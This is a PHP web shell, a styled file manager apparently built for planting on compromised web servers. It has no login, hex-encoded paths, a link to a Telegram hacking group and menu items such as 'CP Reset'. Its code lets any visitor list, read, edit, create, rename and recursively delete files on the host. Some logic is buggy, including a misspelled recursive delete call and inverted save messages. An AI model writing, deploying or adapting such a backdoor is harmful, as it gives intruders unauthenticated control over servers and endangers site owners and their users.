<meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Titillium+Web:wght@600&display=swap');
	:root {
		--color-bg:#f2f2f2;
	}
	body {
		font-family: 'Titillium Web', sans-serif;
		overflow: hidden;
		margin:10px;
	}
	a {
		text-decoration: none;
		color: #000;
	}
	div.container {
		margin:15px;
		width:80%;
		text-align:left;
	}
	div.header {
		border-radius:5px 5px 0px 0px;
		width:100%;
		background: var(--color-bg);
		padding-top:15px;
		padding-bottom:15px;
		border-top: 1px solid #e6e6e6;
		border-left: 1px solid #e6e6e6;
		border-right: 1px solid #e6e6e6;
	}
	span.home {
		margin-left: 15px;
	}
	div.center {
		overflow: auto;
		max-height:550px;
		border-radius:0px 0px 5px 0px;
		padding:10px;
		border-top: 1px solid #e6e6e6;
		border-right: 1px solid #e6e6e6;
		border-bottom: 1px solid #e6e6e6;
	}
	div.tool {
		border-radius:0px 0px 0px 5px;
		width:100%;
		padding:0px;
		border: 1px solid #e6e6e6;
	}
	div.tool a {
		background:#f2f2f2;
		border: 1px solid #e6e6e6;
		display: block;
		margin:10px;
		border-radius:5px;
		padding: 7px;
	}
	div.tool span {
		font-size:15px;
		margin:35px;
	}
	div.tool img {
		margin-top:-0px;
		position: absolute;
	}
	div.dir, div.file {
		padding:1px;

	}
	div.info {
		display: inline-block;
		width:100px;
		padding:3px;
		float: right;
		text-align: center;
	}
	select {
		background:#f2f2f2;
		border-radius:4px;
		border: 1px solid #e6e6e6;
		outline: none;
		font-family: 'Titillium Web', sans-serif;
		width:100%;
	}
	div.edit, div.createfile, div.chname {
		padding:10px;
	}
	textarea {
		border: 1px solid #e6e6e6;
		outline: none;
		padding:20px;
		resize: none;
		width: 100%;
		height:300px;
		border-radius:5px;
	}
	td.action {
		text-align: center;
		font-size:25px;
	}
	input[type=submit] {
		font-family: 'Titillium Web', sans-serif;
		width:100%;
		border-radius:5px;
		background:#f2f2f2;
		border: 1px solid #e6e6e6;
		padding:7px;
	}
	input[type=text] {
		font-family: 'Titillium Web', sans-serif;
		width:100%;
		outline: none;
		border-radius:5px;
		border: 1px solid #e6e6e6;
		padding:7px;
	}
	.icons {
		margin-top:5px;
        width:24px;
        height:24px;
    }
	.filename, .textarea, .submit {
		padding:3px;
	}
	::-webkit-scrollbar {
  		width: 0px;
	}
	::-webkit-scrollbar-track {
  		background: none;
	}
	::-webkit-scrollbar-thumb {
  		background:none;
	}
	::-webkit-scrollbar-thumb:hover {
  		background: none; 
	}
	td.img {
		width:30px;
	}
	td.act {
		width:10%;
	}
	textarea::placeholder {
		color: red;
		opacity: 1;
	}
	textarea:-ms-input-placeholder {
  		color: red;
	}
	textarea::-ms-input-placeholder {
  		color: red;
	}
	.second {
		display: none;
	}
	#modalContainer {
		background-color:rgba(0, 0, 0, 0.3);
		position:absolute;
		width:100%;
		height:100%;
		top:0px;
		left:0px;
		z-index:10000;
	}

	#alertBox {
		position:relative;
		width:300px;
		min-height:165px;
		padding:10px;
		border-radius:10px;
		margin-top:50px;
		background-color:#fff;
		background-repeat:no-repeat;
		background-position:20px 30px;
	}

	#modalContainer > #alertBox {
		position:fixed;
	}

	#alertBox h1 {
		margin:0;
		font-family: 'Titillium Web', sans-serif;
		color:#000;
		border-bottom: 1px solid rgba(222,222,222,0.73);
		border-radius: 10px 10px 00px 0px;
		padding:10px 0 10px 15px;
	}

	#alertBox p {
		font-family: 'Titillium Web', sans-serif;
		height:50px;
		margin-left:16px;
	}

	#alertBox #closeBtn {
		display:block;
		position:relative;
		margin:5px auto;
		outline:none;
		padding:7px 100px;
		border-radius:7px;
		width:70px;
		font-family: 'Titillium Web', sans-serif;
		text-transform:uppercase;
		text-align:center;
		color: #8a8a8a;
		background-color:rgba(222,222,222,0.73);
		text-decoration:none;
	}
	@media (min-width: 320px) and (max-width: 480px) {
		body {
			margin:0;
			overflow: hidden;
		}
		* {
			font-size: 12px;
		}
		div.container {
			margin: 0;
			width:121%;
		}
		div.tool, .size, .perms {
			display: none;
		}
		td.act {
			width:13%;

		}
		.marquee div {
			animation: marquee 5s linear infinite;
		}
		.second {
			display: inline-block;
		}
		select {
  			-moz-appearance: none;
  			-webkit-appearance: none;
  			padding: 2px 2px;
		}
		div.header {
			width:100%;
		}
		div.center {
			height:390px;
		}
	}
</style>
<script type='text/javascript'>
	var alert_TITLE = "Alert";
	var alert_BUTTON_TEXT = "Ok";

	if(document.getElementById) {
		window.alert = function(txt) {
			createCustomalert(txt);
		}
	}
	function createCustomalert(txt) {
		d = document;
		if(d.getElementById("modalContainer")) return;
		mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
		mObj.id = "modalContainer";
		mObj.style.height = d.documentElement.scrollHeight + "px";
		alertObj = mObj.appendChild(d.createElement("div"));
		alertObj.id = "alertBox";
		if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
		alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
		alertObj.style.visiblity="visible";
		h1 = alertObj.appendChild(d.createElement("h1"));
		h1.appendChild(d.createTextNode(alert_TITLE));
		msg = alertObj.appendChild(d.createElement("p"));
		msg.innerHTML = txt;
		btn = alertObj.appendChild(d.createElement("a"));
		btn.id = "closeBtn";
		btn.appendChild(d.createTextNode(alert_BUTTON_TEXT));
		btn.href = "#";
		btn.focus();
		btn.onclick = function() { removeCustomalert();return false; }
		alertObj.style.display = "block";
	}
	function removeCustomalert() {
		document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
	}
</script>
<center>
<div class="container">
	<div class="row">
		<div class="header">
			<span class="home">
				<a href="?">HOME</a>
			</span>
		</div>
	</div>
	<?php
	class x {
		public static $cwd;
		public static $angka;
		public static $handle;
		public static $extension;
		public static function cwd() {
			return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
		}
		public static function cd($directory) {
			return chdir($directory);
		}
		public static function files($type) {
			$result = array();
			foreach (scandir(self::cwd()) as $key => $value) {
				$file['name'] = self::cwd() . DIRECTORY_SEPARATOR . $value;
				switch ($type) {
					case 'dir':
						if (!is_dir($file['name']) || $value === '.') continue 2;
						break;
					case 'file':
						if (!is_file($file['name'])) continue 2;
						break;
				}
				$file['link']	= self::hex($file['name']);
				$file['size'] 	= (is_dir($file['name'])) ? self::countDir($file['name']). " items" : x::size($file['name']);
				$file['perms'] 	= x::w__($file['name'], x::perms($file['name'])); 
				$result[] = $file;
			} return $result;
		}
		public static function save($filename = null, $data, $type) {
			switch ($type) {
				case 'save':
					self::$handle = fopen($filename, "w");
					fwrite(self::$handle, $data);
					fclose(self::$handle);
					break;
				case 'makefile':
					self::$handle = fopen($filename, "w");
					fwrite(self::$handle, $data);
					fclose(self::$handle);
					break;
				case 'makedir':
					return mkdir($filename, 0777);
					break;
			}
		}
		public static function perms($filename) {
			return substr(sprintf("%o", fileperms($filename)), -4);
		}
		public static function redirct($url, $permanent = false) {
			if (headers_sent() === false) {
				header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
			} exit;
		}
		public static function w__($filename, $perms) {
        	if (is_writable($filename)) {
            	return "<font color='green'>{$perms}</font>";
        	} else {
            	return "<font color='red'>{$perms}</font>";
        	}
    	}
    	public static function delete($filename) {
    		if (is_dir($filename)) {
    			foreach (scandir($filename) as $key => $file) {
    				if ($file != '.' && $file != '..') {
    					if (is_dir($filename . DIRECTORY_SEPARATOR . $file)) {
    						self::delet($filename . DIRECTORY_SEPARATOR . $file);
    					} else {
    						unlink($filename . DIRECTORY_SEPARATOR . $file);
    					}
    				}
    			} if (rmdir($filename)) {
    				return true;
    			} else {
    				return false;
    			}
    		} else {
    			if (unlink($filename)) {
    				return true;
    			} else {
    				return false;
    			}
    		}
    	}
    	public static function countDir($filename) {
    		return count(scandir($filename)) -2;
    	}
    	public static function getimg($filename) {
        	self::$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        	switch (self::$extension) {
        		case 'php1':
        		case 'php2':
        		case 'php3':
        		case 'php4':
        		case 'php5':
        		case 'php6':
        		case 'phtml':
            	case 'php':
                	print("https://image.flaticon.com/icons/png/128/337/337947.png");
                	break;
                case 'html':
                case 'htm':
                	print("https://image.flaticon.com/icons/svg/337/337937.svg");
                	break;
                case 'txt':
                	print("https://image.flaticon.com/icons/svg/3022/3022305.svg");
                	break;
                case 'xml':
                	print("https://www.flaticon.com/premium-icon/icons/svg/2656/2656443.svg");
                	break;
                case 'png':
                	print("https://image.flaticon.com/icons/svg/337/337948.svg");
                	break;
                case 'ico':
                	print("https://www.flaticon.com/premium-icon/icons/svg/2266/2266805.svg");
                	break;
                case 'jpg':
                	print("https://image.flaticon.com/icons/svg/136/136524.svg");
                	break;
                case 'css':
                	print("https://image.flaticon.com/icons/svg/2306/2306041.svg");
                	break;
                case 'js':
                	print("https://image.flaticon.com/icons/svg/1126/1126856.svg");
                	break;
                case 'pdf':
                	print("https://www.flaticon.com/premium-icon/icons/svg/2889/2889358.svg");
                	break;
                case 'mp3':
                	print("https://image.flaticon.com/icons/svg/2611/2611401.svg");
                	break;
                case 'mp4':
                	print("https://image.flaticon.com/icons/svg/1719/1719843.svg");
                	break;
                case 'py':
                	print("https://www.flaticon.com/premium-icon/icons/svg/172/172546.svg");
                	break;
                case 'sh':
                	print("https://image.flaticon.com/icons/svg/617/617535.svg");
                	break;
                case 'ini':
                	print("https://image.flaticon.com/icons/svg/1126/1126890.svg");
                	break;
            	default:
                	print("https://image.flaticon.com/icons/svg/833/833524.svg");
                	break;
        	}
    	}
    	public static function hex($string){
    		$hex = '';
    		for ($i=0; $i < strlen($string); $i++) {
    			$hex .= dechex(ord($string[$i]));
    		} return $hex;
    	}
		public static function unhex($hex){
			$string = '';
			for ($i=0; $i < strlen($hex)-1; $i+=2) {
				$string .= chr(hexdec($hex[$i].$hex[$i+1]));
			} return $string;
		}
    	public static function ftime($filename) {
        	return date("F d Y g:i:s", filemtime($filename));
    	}
    	public static function sortname($filename) {
    		if ($filename > 28) {
    			return substr(htmlspecialchars($filename), 0, 28).'...';
    		} else {
    			return $filename;
    		}
    	}
    	public static function chname($filename, $newname) {
    		return rename($filename, $newname);
    	}
    	public static function size($filename) {
        	if (is_file($filename)) {
            	$filepath = $filename;
            	if (!realpath($filepath)) {
                	$filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
            	}
            	$filesize = filesize($filepath);
            	$array = array("TB","GB","MB","KB","B");
            	$total = count($array);
            	while ($total-- && $filesize > 1024) {
                	$filesize /= 1024;
            	} return round($filesize, 2) . " " . $array[$total];
        	}
    	}
	}
	$_POST['file'] = (isset($_POST['file'])) ? x::unhex($_POST['file']) : false;
	?>
	<div class="row">
		<div class="col-xs-2 tool">
			<a href="#">
				<img src="https://image.flaticon.com/icons/svg/785/785822.svg" class="icons">
				<span>Info</span>
			</a>
			<a href="#">
				<img src="https://www.flaticon.com/premium-icon/icons/svg/2242/2242419.svg" class="icons">
				<span>Config</span>
			</a>
			<a href="#">
				<img src="https://image.flaticon.com/icons/svg/892/892311.svg" class="icons">
				<span>Upload</span>
			</a>
			<a href="?cd=<?= x::hex(x::cwd()) ?>&x=createfile">
				<img src="https://image.flaticon.com/icons/svg/2921/2921226.svg" class="icons">
				<span>Add File</span>
			</a>
			<a href="#">
				<img src="https://www.flaticon.com/premium-icon/icons/svg/1824/1824913.svg" class="icons">
				<span>Replace</span>
			</a>
			<a href="#">
				<img src="https://image.flaticon.com/icons/svg/3039/3039386.svg" class="icons">
				<span>Music</span>
			</a>
			<a href="https://t.me/BHSec" target="_blank">
				<img src="https://www.nicepng.com/png/detail/239-2396381_join-us-society-icon-png.png" class="icons">
				<span>Join Us</span>
			</a>
			<a href="#">
				<img src="https://www.pngitem.com/pimgs/m/25-259878_cpanel-logo-png-transparent-png.png" class="icons">
				<span>CP Reset</span>
			</a>
			<a href="#">
				<img src="https://image.flaticon.com/icons/svg/786/786446.svg" class="icons">
				<span>Logout</span>
			</a>
		</div>
		<div class="col-xs-10 center">
			<?php
			switch (isset($_GET['x'])) {
				case 'createfile':
					if (isset($_POST['submit'])) {
						switch ($_POST['type']) {
							case 'file':
								$type = 'makefile';
								break;
							case 'dir':
								$type = 'makedir';
								break;
						}
						if (x::save($_POST['filename'], $_POST['data'], $type)) {
							print("success");
						} else {
							print("failed");
						}
					}
					?>
					<div class="createfile">
						<table width="100%">
							<form method="post">
								<tr>
									<td style="width:1px;">
										<a href="?cd=<?= $_GET['cd'] ?>">
											<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
										</a>
									</td>
									<td class="action">CREATE FILE & DIR</td>
								</tr>
								<tr>
									<td colspan="2">
										<center>
											<input type="radio" name="type" value="file"> file
											<input type="radio" name="type" value="dir"> dir
										</center>
									</td>
								</tr>
								<tr>
									<td colspan="2">
										<input type="text" name="filename" placeholder="filename or dirname">
									</td>
								</tr>
								<tr>
									<td colspan="2">
										<textarea name="data"></textarea>
									</td>
								</tr>
								<tr>
									<td colspan="2">
										<input type="submit" name="submit">
										<input type="hidden" name="tool" value="makefile">
									</td>
								</tr>
							</form>
						</table>
					</div>
					<?php
					exit();
					break;
			}
			switch (@$_POST['action']) {
				case 'delete':
					x::delete($_POST['file']);
					break;
				case 'chname':
					if (isset($_POST['chname'])) {
						if (x::chname($_POST['file'], x::unhex($_GET['cd']) . DIRECTORY_SEPARATOR . $_POST['newname'])) {
							print("success");
						} else {
							print("failed");
						}
					}
					?>
					<div class="chname">
						<table width="100%">
							<tr>
								<td style="width:1;">
									<a href="?cd=<?= $_GET['cd'] ?>">
										<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
									</a>
								</td>
								<td class="action" colspan="2">CHANGE NAME</td>
							</tr>
							<form method="post">
								<tr>
									<td colspan="2">
										<input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
									</td>
								</tr>
								<tr>
									<td colspan="2">
										<input type="submit" name="chname" value="CHANGE">
										<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
										<input type="hidden" name="action" value="chname">
									</td>
								</tr>
							</form>
						</table>
					</div>
					<?php
					exit;
					break;
				case 'edit':
					if (isset($_POST['edit'])) {
						if (x::save($_POST['file'], $_POST['data'], 'save', 'w')) {
							print("<script>alert('failed')</script>");
						} else {
							print("<script>alert('success')</script>");
						}
					}
					?>
					<form method="post">
						<div class="edit">
							<table width='100%'>
								<tr>
									<td style="width:1;">
										<a href="?cd=<?= $_GET['cd'] ?>">
											<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
										</a>
									</td>
									<td class="action" colspan="2">EDIT</td>
								</tr>
								<tr>
									<td style="width:120px;">
										Filename
									</td>
									<td>:</td>
									<td>
										<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
									</td>
								</tr>
								<tr>
									<td style="width:120px;">
										Size
									</td>
									<td>:</td>
									<td>
										<?= x::size($_POST['file']) ?>
									</td>
								</tr>
								<tr>
									<td style="width:120px;">
										Last Modif
									</td>
									<td>:</td>
									<td>
										<?= x::ftime($_POST['file']) ?>
									</td>
								</tr>
								<tr>
									<td colspan="3">
										<textarea name="data" placeholder="not writable"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
									</td>
								</tr>
								<tr>
									<td colspan="3">
										<input type="submit" name="edit" value="SAVE">
										<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
										<input type="hidden" name="action" value="edit">
									</td>
								</tr>
							</table>
						</div>
					</form>
					<?php
					exit();
					break;
				}
				if (isset($_GET['cd'])) {
					x::cd(x::unhex($_GET['cd']));
				}
				?><table width="100%">
					<tr>
						<td colspan="5">cwd</td>
					</tr>
				<?php
				foreach (x::files('dir') as $key => $dir) { ?>
					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
						<tr>
							<td class="img">
								<img class="icons" src="https://image.flaticon.com/icons/svg/716/716784.svg">
							</td>
							<td>
								<a href="?cd=<?= $dir['link'] ?>"><?= basename($dir['name']) ?></a>
							</td>
							<td class="size">
								<?= $dir['size'] ?>
							</td>
							<td class="perms">
								<?= $dir['perms'] ?>
							</td>
							<td class="act">
								<select name="action" onchange="if(this.value != '0') this.form.submit()">
									<option selected disabled>action</option>
									<option value="chname">changename</option>
									<option value="delete">delete</option>
								</select>
								<input type="hidden" name="file" value="<?= x::hex($dir['name']) ?>">
							</td>
						</tr>
					</form>
				<?php }
				foreach (x::files('file') as $key => $file) { ?>
					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
						<tr>
							<td>
								<img class="icons" src="<?= x::getimg($file['name']) ?>">
							</td>
							<td>
								<span title="<?= basename($file['name']) ?>">
									<?= x::sortname(basename($file['name'])) ?>
								</span>
							</td>
							<td class="size">
								<?= $file['size'] ?>
							</td>
							<td class="perms">
								<?= $file['perms'] ?>
							</td>
							<td>
								<select name="action" onchange="if(this.value != '0') this.form.submit()">
									<option selected disabled>action</option>
									<option value="edit">edit</option>
									<option value="chname">changename</option>
									<option value="delete">delete</option>
							</select>
							<input type="hidden" name="file" value="<?= x::hex($file['name']) ?>">
							</td>
						</tr>
					</form>
				<?php }
				?>
			</table>
		</div>
	</div>
</div>
</center>
